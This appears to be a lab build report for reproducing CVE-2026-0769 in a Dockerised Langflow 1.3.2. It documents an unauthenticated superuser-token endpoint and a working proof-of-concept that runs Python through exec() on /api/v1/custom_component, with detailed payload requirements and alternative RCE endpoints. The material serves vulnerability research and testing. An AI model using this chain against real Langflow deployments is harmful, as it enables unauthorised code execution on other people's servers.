# Lab Build Report: CVE-2026-0769

## Lab Architecture

**Single-container deployment** using the official Langflow Docker image. No external database or supporting services required — Langflow uses embedded SQLite by default.

| Component | Description |
|---|---|
| **Vulnerable Container** | `langflowai/langflow:1.3.2` — Langflow 1.3.2 with eval injection in `eval_custom_component_code()` |
| **Database** | SQLite (embedded, no separate container) |
| **Authentication** | AUTO_LOGIN=True (default) — no credentials required |

## Container Details

### cve-2026-0769-vulnerable

| Field | Value |
|---|---|
| **Image** | `langflowai/langflow:1.3.2` |
| **Container Name** | `cve-2026-0769-vulnerable` |
| **Internal Port** | 7860 |
| **Host Port** | 7860 |
| **Networks** | `lab-net` (bridge) |
| **Process User** | `user` (uid=1000, gid=0/root) |
| **Health Check** | `python -c "import urllib.request; urllib.request.urlopen('http://localhost:7860/api/v1/version')"` |
| **Start Time** | ~30 seconds to healthy |

### Environment Variables

| Variable | Value | Purpose |
|---|---|---|
| `LANGFLOW_AUTO_LOGIN` | `true` | Enables unauthenticated auto_login endpoint |
| `LANGFLOW_HOST` | `0.0.0.0` | Listen on all interfaces |
| `LANGFLOW_PORT` | `7860` | HTTP API port |

## Network Configuration

The vulnerable container is attached to a `lab-net` bridge network. The container is reachable from the host via `localhost:7860`.

```bash
curl "http://localhost:7860/health"
```

## Build Status

| Step | Status | Notes |
|---|---|---|
| Image pull | Success | `langflowai/langflow:1.3.2` pulled from Docker Hub |
| Container start | Success | Started in ~1 second |
| Health check | Healthy | Passed after ~30 seconds |
| API reachable | Verified | `/health`, `/api/v1/version`, `/api/v1/auto_login` all responding |
| RCE verified | Confirmed | Marker file written via `exec()` of user-supplied code |

No workarounds or patches were needed. The official Docker image runs the vulnerable version out of the box.

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs -f vulnerable

# Stop lab
docker compose down

# Stop and reset (remove volumes)
docker compose down -v
```

## Verification Evidence

### 1. Health Endpoint
```
GET /health → {"status": "ok"}
```

### 2. Version Confirmation
```
GET /api/v1/version → {"version": "1.3.2", "main_version": "1.3.2", "package": "Langflow"}
```

### 3. Authentication Bypass (AUTO_LOGIN)
```
GET /api/v1/auto_login → {"access_token": "<365-day JWT>", "refresh_token": null, "token_type": "bearer"}
```
No credentials required. Returns a valid superuser JWT token.

### 4. RCE Confirmation
Sent POST to `/api/v1/custom_component` with payload:
```python
import os
_x = open("/tmp/cve-2026-0769-marker", "w").write("EXPLOITED-CVE-2026-0769")

from langflow.custom import Component
from langflow.io import Output

class Exploit(Component):
    display_name = "Exploit"
    outputs = [Output(name="output", display_name="Output", method="run")]
    def run(self) -> str:
        return "test"
```
Result: HTTP 200. Marker file `/tmp/cve-2026-0769-marker` confirmed inside container with content `EXPLOITED-CVE-2026-0769`.

**Key finding**: The payload must use an **assignment statement** (e.g., `_x = open(...)`) rather than a bare expression (e.g., `open(...)`) because `prepare_global_scope()` only processes `ast.Assign` nodes (along with imports, class defs, and function defs). Standalone expression statements are not exec'd.

## Target Endpoints

| Endpoint | Method | Auth | Purpose |
|---|---|---|---|
| `/api/v1/auto_login` | GET | None | Obtain superuser JWT (auth bypass) |
| `/api/v1/custom_component` | POST | Bearer JWT | Submit code for exec() — **primary RCE vector** |
| `/api/v1/custom_component/update` | POST | Bearer JWT | Alternative RCE vector (same code path) |
| `/api/v1/validate/code` | POST | Bearer JWT | Another exec() vector (validates function defs) |

### Payload Requirements
- Code must contain a class inheriting from a base with "Component" or "LC" in its name
- Module-level RCE code must be an **assignment statement** (processed by `prepare_global_scope()`)
- Class-body assignments also work (processed by `build_class_constructor()`)
- The `exec()` runs as `user` (uid=1000) with `root` group membership

## Known Issues

- **None.** The lab works as expected with no workarounds required.
- The container runs as `user` (uid=1000) rather than `root`, but this user has `gid=0(root)` group membership, giving broad file access.
- Langflow startup takes ~30 seconds before the API is ready; the health check handles this automatically.

## Files

| File | Path | Description |
|---|---|---|
| `docker-compose.yml` | `docker-compose.yml` | Lab orchestration |
